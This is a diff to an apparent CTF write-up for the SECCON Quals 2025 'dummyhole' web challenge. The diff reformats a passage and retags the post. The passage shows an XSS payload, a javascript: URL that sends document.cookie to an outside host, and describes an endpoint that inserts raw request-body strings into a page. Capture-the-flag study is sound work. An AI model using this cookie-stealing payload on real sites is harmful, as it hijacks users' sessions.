@@ -1,7 +1,7 @@
 ---
 title: SECCON Quals 2025 - dummyhole - 15 solves
 published: true
-tags: [web, xss, CTF, SECCON]
+tags: [web, 8/10]
 difficulty: medium
 ---
 
@@ -86,7 +86,13 @@ if (!fallbackUrl) {
 location.href = fallbackUrl;
 ```
 
-So the job here is to prevent the first redirection in order to, e.g. have `javascript:location='http://web.cyber-man.pl:1337/?flag='+encodeURIComponent(document.cookie)` as the fallback url. The endpoint showing the above `logout.html` and actually supplying the values in brackets is replacing them with raw strings supplied by the request body:
+So the job here is to prevent the first redirection in order to, e.g. have
+
+```
+javascript:location='http://web.cyber-man.pl:1337/?flag='+encodeURIComponent(document.cookie)
+```
+
+as the fallback url. The endpoint showing the above `logout.html` and actually supplying the values in brackets is replacing them with raw strings supplied by the request body:
 
 ```js
 app.post("/logout", requireAuth, (req, res) => {
